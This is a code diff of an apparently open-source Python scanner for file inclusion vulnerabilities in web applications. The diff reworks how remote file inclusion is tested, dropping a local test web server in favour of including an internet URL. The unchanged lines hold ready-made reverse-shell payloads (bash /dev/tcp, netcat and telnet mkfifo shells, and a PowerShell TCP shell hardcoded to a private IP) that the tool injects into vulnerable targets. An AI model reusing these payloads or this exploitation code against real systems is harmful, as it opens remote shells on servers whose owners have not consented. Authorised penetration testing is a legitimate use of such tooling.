@@ -17,21 +17,6 @@ from http.server import HTTPServer, SimpleHTTPRequestHandler
 from argparse import RawTextHelpFormatter
 
 
-class MyHandler(SimpleHTTPRequestHandler):
-    
-    def do_GET(self):
-        if(self.path =='/'):
-            self.wfile.write(bytes("961bb08a95dbc34397248d92352da799", "utf-8"))
-            self.send_response(200)
-            self.send_header('Content-type', 'text/html')
-            self.end_headers()
-        else: return SimpleHTTPRequestHandler.do_GET(self)
-    
-    def do_QUIT(self):
-        self.send_response(200)
-        self.end_headers()
-        self.server.stop = True
-
 exploits = []
 proxies = {}
 
@@ -244,7 +229,6 @@ def test_php_input(url):
                 break
 
     if(os != 'LINUX'):
-        print(os)
         #Windows
         for k in range(len(testW)):
             if("DESTROY" in url):
@@ -318,61 +302,19 @@ def test_rfi(url):
     if(args.verbose):
         print("Testing for RFI ...")
 
-    rfi  = False
-    #Local RFI test
-    if(args.lhost):
-        try:
-            server = HTTPServer((args.lhost, 75), MyHandler)
-            webThread = threading.Thread(target = server.serve_forever)
-            webThread.setDaemon = True
-            webThread.start()
-            
-            #Creating temporary file for testing RFI
-            f = open("rfitest.txt", "w")
-            f.write("961bb08a95dbc34397248d92352da799")
-            f.close()
+    #Internet RFI test
+    if("DESTROY" in url):
+        pyld = "https%3a//www.google.com/"
+        u = url.replace("DESTROY", pyld)
+    try:
+        res = requests.get(u, headers = headers, proxies = proxies, timeout = 2)
+        if(checkPayload(res)):
+            tempUrl = u.replace(pyld, 'TMP')
+            getExploit(res, 'GET', 'RFI', tempUrl, '', headers, 'RFI', 'UNKN')
+            print("[+] RFI -> " + u)
 
-            con = HTTPConnection("localhost:%d" % 75)
-            con.request("QUIT", "/")
-
-        except KeyboardInterrupt:
-            print("Keyboard interrupt, stopping web server")
-        except OSError:
-            print("Cannot setup local web server with provided lhost address")
-        except:
-            pass
-
-        if('DESTROY' in url):
-            pyld = "http%3a//"+args.lhost+":75/rfitest.txt"
-            u = url.replace('DESTROY', pyld)
-            try:
-                res = requests.get(u, headers = headers, proxies = proxies, timeout = 2)
-                if(checkPayload(res)):
-                    tempUrl = u.replace(pyld, 'TMP')
-                    getExploit(res, 'GET', 'RFI', tempUrl, '', headers, 'RFI', 'UNKN')
-                    print("[+] RFI -> " + u)
-                    rfi = True
-            except:
-                pass
-
-    #Deleting temporary file
-    if(os.path.exists("rfitest.txt")):
-        os.remove("rfitest.txt")
-
-    if(not rfi):
-        #Internet RFI test
-        if("DESTROY" in url):
-            pyld = "https%3a//www.google.com/"
-            u = url.replace("DESTROY", pyld)
-        try:
-            res = requests.get(u, headers = headers, proxies = proxies, timeout = 2)
-            if(checkPayload(res)):
-                tempUrl = u.replace(pyld, 'TMP')
-                getExploit(res, 'GET', 'RFI', tempUrl, '', headers, 'RFI', 'UNKN')
-                print("[+] RFI -> " + u)
-
-        except:
-            pass
+    except:
+        pass
 
     if(args.revshell):
         exploit(exploits, 'RFI')
@@ -414,7 +356,6 @@ def exploit(exploits, method):
         bashPayload = "echo+'bash+-i+>%26+/dev/tcp/"+ip+"/"+str(port)+"+0>%261'>/tmp/1.sh"
         ncPayload = "rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2>%261|nc+" +ip+'+'+str(port)+"+>/tmp/f"
         telnetPayload = "rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2>%261|telnet+{0}+{1}+>/tmp/f".format(ip, port)
-        
         powershellPayload = "powershell+-nop+-c+\"$client+%3d+New-Object+System.Net.Sockets.TCPClient('192.168.80.129',99)%3b$stream+%3d+$client.GetStream()%3b[byte[]]$bytes+%3d+0..65535|%25{0}%3bwhile(($i+%3d+$stream.Read($bytes,+0,+$bytes.Length))+-ne+0){%3b$data+%3d+(New-Object+-TypeName+System.Text.ASCIIEncoding).GetString($bytes,0,+$i)%3b$sendback+%3d+(iex+$data+2>%261+|+Out-String+)%3b$sendback2+%3d+$sendback+%2b+'PS+'+%2b+(pwd).Path+%2b+'>+'%3b$sendbyte+%3d+([text.encoding]%3a%3aASCII).GetBytes($sendback2)%3b$stream.Write($sendbyte,0,$sendbyte.Length)%3b$stream.Flush()}%3b$client.Close()\""
 
         if(exploit['ATTACK_METHOD'] == method and method == 'INPUT'):
@@ -807,9 +748,9 @@ if(__name__ == "__main__"):
         print("WARNING: Cookie argument ('-c') is not provided. lfimap might have troubles finding vulnerabilities if web app requires a cookie.\n")
         time.sleep(2)
 
-    if(args.rfi and not args.lhost):
-        print("WARNING: RFI test will try to include source from internet, not locally, because '--lhost' is not set.\n")
-        time.sleep(2)
+    if(args.rfi):
+        print("WARNING: RFI test is done assuming target is connected to the internet...")
+        time.sleep(1)
 
     
     #Everything is OK, preparing http request headers
